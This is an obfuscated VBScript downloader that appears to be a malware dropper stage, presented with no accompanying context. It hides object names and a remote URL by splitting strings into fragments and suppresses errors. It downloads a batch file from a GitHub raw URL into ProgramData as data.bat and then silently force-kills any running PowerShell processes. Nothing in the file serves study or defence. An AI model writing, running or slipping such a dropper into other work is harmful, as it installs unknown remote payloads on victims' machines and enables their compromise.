On Error Resume Next
Dim x1, x2, p1, p2, p3
Set x1 = CreateObject("WScr" & "ipt.S" & "hell")
Set x2 = CreateObject("Script" & "ing.Fi" & "leSys" & "temOb" & "ject")
p1 = x1.ExpandEnvironmentStrings("%Prog" & "ramDa" & "ta%")
p2 = p1 & "\d" & "a" & "t" & "a" & "." & "b" & "a" & "t"
p3 = "ht" & "tps" & ":" & "//" & "raw" & "." & "git" & "hubuser" & "content" & "." & "com/" & "bat2exe/K" & "emati" & "an/re" & "fs/h" & "eads/m" & "ain/d" & "." & "bat"
If x2.FileExists(p2) Then
    x2.DeleteFile p2, True
End If
Dim x3
Set x3 = CreateObject("MSX" & "ML2.Ser" & "verX" & "MLH" & "TTP" & ".6" & ".0")
x3.Open "G" & "E" & "T", p3, False
x3.Send
If x3.Status = 200 Then
    Dim x4
    Set x4 = CreateObject("ADO" & "DB.S" & "tre" & "am")
    x4.Type = 1
    x4.Open
    x4.Write x3.ResponseBody
    x4.SaveToFile p2, 2
    x4.Close
    Set x4 = Nothing
End If
x1.Run "task" & "kill /F /I" & "M pow" & "ershe" & "ll.ex" & "e", 0, False
Set x3 = Nothing
Set x2 = Nothing
Set x1 = Nothing
